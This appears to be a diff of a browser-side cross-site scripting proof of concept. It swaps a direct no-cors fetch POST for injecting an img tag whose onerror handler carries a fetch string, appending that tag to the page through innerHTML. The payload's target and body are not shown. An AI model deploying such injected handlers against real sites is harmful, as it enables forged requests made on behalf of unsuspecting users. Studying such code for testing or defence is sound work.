@@ -35,16 +35,9 @@
             var XSS = '<img src="/" onerror="' + fetchString + '"/>';
             document.title = XSS;
 
-            // Execute the fetch POST request
-            fetch(url, {
-                method: method,
-                body: body,
-                headers: headers,
-                mode: 'no-cors'
-            })
-            .then(response => console.log("Request sent successfully:", response))
-            .catch(error => console.error("Error sending request:", error));
-        }
+            var container = document.createElement('div');
+            container.innerHTML = XSS;
+            document.body.appendChild(container);
 
         // Wait for 3 seconds and then create the script tag with the POST request
         setTimeout(function () {
